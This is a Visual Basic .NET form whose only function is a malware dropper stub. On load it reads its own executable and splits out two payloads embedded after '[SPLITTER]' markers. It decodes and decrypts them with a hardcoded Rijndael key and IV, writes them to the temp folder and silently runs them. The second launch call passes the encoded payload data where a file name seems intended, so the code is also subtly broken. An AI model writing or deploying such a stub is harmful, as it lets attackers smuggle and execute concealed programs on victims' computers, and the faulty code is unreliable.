Public Class Form1

    Function Unsecure(ByVal data As Byte()) As Byte()

        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim TempDir As String = My.Computer.FileSystem.SpecialDirectories.Temp
        Dim drop() As String = Split(System.IO.File.ReadAllText(Application.ExecutablePath), "[SPLITTER]")

        Dim file1 As Byte() = Unsecure(Convert.FromBase64String(drop(1)))
        Dim file2 As Byte() = Unsecure(Convert.FromBase64String(drop(3)))

        My.Computer.FileSystem.WriteAllBytes(TempDir & "\" & drop(2), file1, False)
        My.Computer.FileSystem.WriteAllBytes(TempDir & "\" & drop(4), file2, False)

        Process.Start(TempDir & "\" & drop(2)) : Process.Start(TempDir & "\" & drop(1))

    End Sub
End Class
